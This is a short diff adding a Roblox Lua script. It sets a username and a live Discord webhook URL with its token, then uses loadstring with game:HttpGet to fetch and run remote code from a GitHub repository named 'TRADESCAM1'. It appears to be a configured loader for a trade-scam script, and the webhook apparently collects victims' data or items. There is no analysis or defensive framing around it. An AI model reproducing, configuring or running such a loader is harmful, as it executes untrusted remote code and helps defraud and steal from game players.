@@ -1,0 +1,6 @@
+UserName = "pgasyt"
+Webhook = "https://discord.com/api/webhooks/1152323184260026479/2d9C5GnH9YWySyfKlhDLdkFqe82gf0lInqSlLZOJrnI6cSNtXD_ILzuij36dHh9fzPIf"
+UserName2 = "pgasyt"
+ 
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ASTORSCRIPTS/TRADESCAM1/main/ASTOR", true))()
